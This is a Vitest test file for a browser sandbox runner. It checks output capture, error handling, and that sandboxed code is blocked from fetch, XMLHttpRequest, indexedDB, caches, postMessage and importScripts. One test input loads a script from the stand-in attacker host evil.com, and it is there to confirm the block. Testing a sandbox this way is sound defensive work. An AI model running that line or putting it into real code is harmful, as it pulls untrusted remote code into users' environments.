import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { runNodeCodeSandbox } from './sandboxRunner';
import type { FileItem } from '../../db';

describe('sandboxRunner', () => {
  const originalWorker = globalThis.Worker;
  const originalCreateObjectURL = globalThis.URL?.createObjectURL;
  const originalRevokeObjectURL = globalThis.URL?.revokeObjectURL;
  const blobContentMap = new Map<string, Blob>();
  let blobCounter = 0;

  class ExecutingMockWorker {
    onmessage: ((e: MessageEvent) => void) | null = null;
    onerror: ((e: ErrorEvent) => void) | null = null;
    private blobUrl: string;

    constructor(url: string) {
      this.blobUrl = url;
    }

    async postMessage(data: { codeToRun: string; env: Record<string, string>; files: FileItem[] }) {
      const blob = blobContentMap.get(this.blobUrl);
      let workerCode = '';
      if (blob) {
        workerCode = await blob.text();
      }

      // Create isolated worker global scope
      const workerScope: Record<string, unknown> = {};
      workerScope.postMessage = (msg: unknown) => {
        if (this.onmessage) {
          this.onmessage({ data: msg } as MessageEvent);
        }
      };

      try {
        new Function('self', 'globalThis', workerCode)(workerScope, workerScope);
        if (typeof (workerScope as { onmessage?: (e: { data: unknown }) => void }).onmessage === 'function') {
          (workerScope as { onmessage: (e: { data: unknown }) => void }).onmessage({ data });
        }
      } catch (err: unknown) {
        if (this.onerror) {
          this.onerror({ message: err instanceof Error ? err.message : String(err) } as ErrorEvent);
        }
      }
    }

    terminate() {}
  }

  beforeEach(() => {
    blobContentMap.clear();
    blobCounter = 0;
    globalThis.URL.createObjectURL = vi.fn((blob: Blob) => {
      const url = `blob:test-${++blobCounter}`;
      blobContentMap.set(url, blob);
      return url;
    });
    globalThis.URL.revokeObjectURL = vi.fn();
    globalThis.Worker = ExecutingMockWorker as unknown as typeof Worker;
  });

  afterEach(() => {
    if (originalWorker !== undefined) {
      globalThis.Worker = originalWorker;
    } else {
      // @ts-expect-error cleanup
      delete globalThis.Worker;
    }
    globalThis.URL.createObjectURL = originalCreateObjectURL;
    globalThis.URL.revokeObjectURL = originalRevokeObjectURL;
  });

  it('should gracefully fail when Web Workers are unavailable', async () => {
    // @ts-expect-error deliberately simulate missing Worker API
    delete globalThis.Worker;
    
    const result = await runNodeCodeSandbox('console.log("hello")', {}, []);
    expect(result.outputType).toBe('stderr');
    expect(result.outputText).toContain('Failed to initialize sandbox: Worker is not defined');
  });

  it('should evaluate code and capture console.log and return value', async () => {
    const result = await runNodeCodeSandbox('console.log("hello world"); return 21 * 2;', {}, []);
    expect(result.outputType).toBe('stdout');
    expect(result.outputText).toBe('hello world\n42');
  });

  it('should format object return values as JSON', async () => {
    const result = await runNodeCodeSandbox('return { name: "laide", status: "ok" };', {}, []);
    expect(result.outputType).toBe('stdout');
    expect(result.outputText).toContain('"name": "laide"');
    expect(result.outputText).toContain('"status": "ok"');
  });

  it('should distinguish runtime errors and capture previous logs in stderr', async () => {
    const result = await runNodeCodeSandbox('console.log("step 1"); throw new Error("something crashed");', {}, []);
    expect(result.outputType).toBe('stderr');
    expect(result.outputText).toContain('step 1');
    expect(result.outputText).toContain('Error: something crashed');
  });

  it('should throw immediately when code attempts to access self.indexedDB.open', async () => {
    const result = await runNodeCodeSandbox('self.indexedDB.open("app-db");', {}, []);
    expect(result.outputType).toBe('stderr');
    expect(result.outputText).toContain('SecurityError: Access to indexedDB is disabled in this sandboxed environment');
  });

  it('should throw immediately when code attempts to access fetch', async () => {
    const result = await runNodeCodeSandbox('fetch("https://example.com/api");', {}, []);
    expect(result.outputType).toBe('stderr');
    expect(result.outputText).toContain('SecurityError: Access to fetch is disabled in this sandboxed environment');
  });

  it('should throw immediately when code attempts to access self.caches.open', async () => {
    const result = await runNodeCodeSandbox('self.caches.open("v1");', {}, []);
    expect(result.outputType).toBe('stderr');
    expect(result.outputText).toContain('SecurityError: Access to caches is disabled in this sandboxed environment');
  });

  it('should throw immediately when code attempts to access self.importScripts', async () => {
    const result = await runNodeCodeSandbox('self.importScripts("https://evil.com/script.js");', {}, []);
    expect(result.outputType).toBe('stderr');
    expect(result.outputText).toContain('SecurityError: Access to importScripts is disabled in this sandboxed environment');
  });

  it('should throw immediately when code attempts to access XMLHttpRequest', async () => {
    const result = await runNodeCodeSandbox('new XMLHttpRequest();', {}, []);
    expect(result.outputType).toBe('stderr');
    expect(result.outputText).toContain('SecurityError: Access to XMLHttpRequest is disabled in this sandboxed environment');
  });

  it('should throw immediately when code attempts to call self.postMessage', async () => {
    const result = await runNodeCodeSandbox('self.postMessage("intercept");', {}, []);
    expect(result.outputType).toBe('stderr');
    expect(result.outputText).toContain('SecurityError: Access to postMessage is disabled in this sandboxed environment');
  });

  it('should provide access to files and env parameters passed into the sandbox', async () => {
    const files = [
      { id: 'f1', projectId: 'p1', path: '/hello.txt', content: 'world', updatedAt: Date.now() }
    ];
    const env = { NODE_ENV: 'test', MY_VAR: '123' };
    const result = await runNodeCodeSandbox('console.log(env.MY_VAR); return files[0].content;', env, files);
    expect(result.outputType).toBe('stdout');
    expect(result.outputText).toBe('123\nworld');
  });
});

